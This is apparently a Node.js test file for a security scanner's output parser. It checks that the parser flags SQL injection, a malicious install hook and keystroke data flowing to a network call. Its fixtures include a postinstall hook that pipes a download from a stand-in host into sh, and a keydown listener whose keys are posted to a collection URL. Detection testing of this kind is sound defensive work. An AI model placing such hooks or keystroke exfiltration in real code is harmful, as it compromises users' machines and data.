import assert from 'node:assert/strict'
import test from 'node:test'

import { parseScannerOutput } from '../dist/checks/analysis.js'

const b64 = (value) => Buffer.from(value).toString('base64')
const candidate = (category, file, line, text) =>
  `CODEVET_CANDIDATE:${category}:${b64(file)}:${line}:1:${b64(text)}:${b64(text)}`
const context = (file, line, text) =>
  `CODEVET_CONTEXT:${b64(file)}:${line}:${b64(text)}`
const edge = (from, to) => `CODEVET_IMPORT:${b64(from)}:${b64(to)}`
const output = (lines) => [
  'CODEVET_COMMIT:0123456789012345678901234567890123456789',
  'CODEVET_INVENTORY_BEGIN',
  'CODEVET_INVENTORY_COUNT:2',
  `CODEVET_FILE:${b64('src/input.ts')}`,
  `CODEVET_FILE:${b64('src/network.ts')}`,
  'CODEVET_INVENTORY_END',
  'CODEVET_DISCOVERY_BEGIN',
  ...lines,
  'CODEVET_DISCOVERY_END',
].join('\n')

test('detects likely SQL injection deterministically', () => {
  const code = 'db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)'
  const result = parseScannerOutput(output([
    candidate('security_signal', 'src/input.ts', 10, code),
    context('src/input.ts', 10, code),
  ]))
  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'likely-sql-injection'))
})

test('detects high-risk supply-chain behavior deterministically', () => {
  const code = '"postinstall": "curl https://bad.invalid/p | sh"'
  const result = parseScannerOutput(output([
    candidate('supply_chain', 'package.json', 8, code),
    context('package.json', 8, code),
  ]))
  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'malicious-install-hook'))
  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'download-and-execute'))
})

test('correlates sensitive sources and network sinks across direct imports', () => {
  const source = "window.addEventListener('keydown', (event) => send(event.key))"
  const sink = "fetch('https://example.invalid/collect', { method: 'POST' })"
  const result = parseScannerOutput(output([
    candidate('keyboard_input', 'src/input.ts', 4, source),
    context('src/input.ts', 4, source),
    candidate('external_http', 'src/network.ts', 7, sink),
    context('src/network.ts', 7, sink),
    edge('src/input.ts', 'src/network.ts'),
  ]))
  assert.equal(result.candidateFlows.length, 1)
  assert.equal(result.candidateFlows[0].correlation.kind, 'direct_import')
})
